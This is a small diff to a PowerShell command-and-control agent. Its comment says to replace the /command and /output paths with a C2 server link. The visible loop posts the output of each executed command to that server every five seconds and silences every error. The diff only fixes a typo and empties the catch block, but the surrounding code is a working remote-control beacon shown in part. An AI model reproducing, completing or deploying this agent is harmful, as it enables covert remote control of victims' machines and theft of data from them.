@@ -1,4 +1,4 @@
-# repalce /command & /output with c2 server link.
+# replace /command & /output with c2 server link.
 $a1 = '/command'
 $b2 = '/output'
 
@@ -17,8 +17,6 @@ while ($true) {
 
             (& $iwr $b2 -Method POST -Body @{output=$out} -UseBasicParsing) | Out-Null
         }
-    } catch {
-        # Ignore errors silently
-    }
+    } catch {}
     Start-Sleep -Seconds 5
 }
